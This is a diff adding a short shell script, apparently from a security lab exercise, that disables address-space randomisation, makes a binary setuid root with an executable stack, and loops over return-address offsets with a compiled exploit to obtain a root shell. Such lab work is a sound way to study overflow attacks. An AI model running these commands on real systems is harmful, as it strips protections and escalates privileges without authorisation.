@@ -1,0 +1,15 @@
+# Task 1: Find the root shell. This script tries offsets sequential for the correct return addr.
+sudo sysctl -w kernel.randomize_va_space=0
+
+sudo chmod 4755 readfile
+sudo execstack -s readfile
+gcc -g -o exploit1 exploit1.c
+
+x=0
+
+while true;
+do
+	echo "[$x] ================================================="
+	./exploit1 $x && ./readfile
+	x=$(( $x + 1 ))
+done
